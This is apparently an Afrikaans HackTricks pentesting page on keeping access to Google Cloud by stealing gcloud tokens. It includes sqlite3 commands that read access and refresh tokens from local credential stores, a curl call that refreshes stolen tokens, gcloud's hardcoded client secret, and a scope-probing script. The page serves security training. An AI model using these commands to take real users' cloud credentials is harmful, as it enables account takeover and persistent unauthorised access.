# GCP - Token-persistensie

{{#include ../../../banners/hacktricks-training.md}}

### Geverifieerde gebruiker-tokens

Om die **huidige token** van 'n gebruiker te kry, kan jy die volgende uitvoer:

<details>

<summary>Kry toegangstoken uit die SQLite-databasis</summary>
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
</details>

Kyk op hierdie bladsy hoe om hierdie token **direk met gcloud te gebruik**:

{{#ref}}
https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#gcp
{{#endref}}

Om die besonderhede te kry om **generate a new access token**, voer die volgende uit:

<details>

<summary>Kry refresh token uit die SQLite database</summary>
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
</details>

Dit is ook moontlik om refresh tokens te vind in **`$HOME/.config/gcloud/application_default_credentials.json`** en in **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

Om 'n nuwe access token te kry deur die **refresh token**, client ID en client secret te gebruik, voer uit:

<details>

<summary>Kry nuwe access token met behulp van refresh token</summary>
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
</details>

Die geldigheid van refresh tokens kan bestuur word in **Admin** > **Security** > **Google Cloud session control**, en standaard is dit op 16h gestel alhoewel dit ingestel kan word om nooit te verval nie:

<figure><img src="../../../images/image (11).png" alt=""><figcaption></figcaption></figure>

### Outentiseringsvloei

Die outentiseringsvloei wanneer 'n gebruiker iets soos `gcloud auth login` gebruik, sal 'n prompt in die blaaier oopmaak en nadat alle scopes aanvaar is, sal die blaaier 'n versoek soos die volgende na die http-poort wat deur die tool oopgemaak is, stuur:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Dan sal gcloud die state en code gebruik saam met 'n paar hardgekodeerde `client_id` (`32555940559.apps.googleusercontent.com`) en **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) om die **finale refresh token-data** te kry.

> [!CAUTION]
> Let wel dat die kommunikasie met localhost oor HTTP plaasvind, so dit is moontlik om die data af te vang om 'n refresh token te kry; egter is hierdie data net 1 keer geldig, dus sou dit nutteloos wees — dit is makliker om net die refresh token uit die lêer te lees.

### OAuth Toestemmings

Jy kan al die Google-scopes vind by [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) of kry hulle deur dit uit te voer:

<details>

<summary>Haal alle Google OAuth-scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
</details>

Dit is moontlik om te sien watter scopes die toepassing wat **`gcloud`** gebruik om te verifieer, met hierdie skrip kan ondersteun:

<details>

<summary>Toets ondersteunde scopes vir gcloud</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
</details>

Na uitvoering daarvan is bevestig dat hierdie app die volgende scopes ondersteun:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
dit is interessant om te sien hoe hierdie app die **`drive`**-scope ondersteun, wat 'n gebruiker kan toelaat om van GCP na Workspace op te skaal as 'n aanvaller daarin slaag om die gebruiker te dwing om 'n token met hierdie scope te genereer.

**Kyk hoe om** [**dit hier te misbruik**](../gcp-to-workspace-pivoting/index.html#abusing-gcloud)**.**

### Diensrekeninge

Soos met geverifieerde gebruikers, as jy daarin slaag om die **privaat-sleutel-lêer** van 'n diensrekening te kompromitteer sal jy gewoonlik **toegang daartoe kan behou so lank as wat jy wil**.\
Indien jy egter die **OAuth token** van 'n diensrekening steel, kan dit nog interessanter wees, omdat, selfs al is hierdie tokens standaard slegs vir 'n uur bruikbaar, as die **slagoffer die private API-sleutel verwyder, die OAuth token steeds geldig sal bly totdat dit verstryk**.

### Metadata

Natuurlik, solank jy binne 'n masjien is wat in die GCP-omgewing loop, sal jy in staat wees om die **service account wat aan daardie masjien aangeheg is te bereik deur die metadata-endpoint te kontak** (let daarop dat die OAuth tokens wat jy in hierdie endpoint kan toegang kry gewoonlik deur scopes beperk is).

### Herstelmaatreëls

Sommige herstelmaatreëls vir hierdie tegnieke word verduidelik in [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

### Verwysings

- [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
- [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

{{#include ../../../banners/hacktricks-training.md}}
